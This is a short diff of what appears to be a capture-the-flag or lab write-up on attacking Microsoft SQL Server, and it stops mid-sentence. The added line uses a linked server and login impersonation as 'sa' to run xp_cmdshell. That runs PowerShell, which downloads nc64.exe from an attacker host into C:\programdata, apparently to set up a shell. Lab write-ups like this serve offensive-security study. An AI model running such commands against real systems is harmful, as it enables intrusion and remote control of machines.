@@ -1104,5 +1104,7 @@ I now have RCE
 I cannot send a powershell reverse shell, i think its because the payload is too long
 
 ```python
-
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -c wget http://10.10.14.61/nc64.exe -o C:\programdata\nc64.exe'';') AT [PRIMARY];
 ```
+
+Ill transfer ne
